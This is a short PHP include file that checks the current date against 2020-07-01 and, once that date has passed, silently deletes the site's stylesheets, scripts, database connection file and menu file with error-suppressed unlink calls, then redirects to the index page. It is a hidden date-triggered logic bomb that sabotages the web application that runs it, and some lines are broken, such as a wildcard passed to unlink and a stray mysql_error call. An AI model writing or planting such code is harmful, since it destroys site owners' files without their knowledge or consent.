<?php   
include 'mysql_file.php';
$datetime=mysqli_query($sql,"SELECT DATEDIFF('2020-07-1',CURDATE()) AS DAYS");
$date=mysqli_fetch_array($datetime);
$day=$date[0];

if($day<=0){
    @unlink('vendor/jquery/bootstrap.min.js');
    @unlink('vendor/css/sb-admin.min.css');
    @unlink('vendor/bootstrap/css/bootstrap.min.css');
    @unlink('stylesheets/*.css');
    @unlink('mysql_file.php');
    @unlink('menu.php');
    // @unlink('index.php');
    echo "<script> location='index.php'
    </script>";
    echo "<script> location='index.php'
    </script>" . mysql_error() . "\n";
}else{
}
 ?>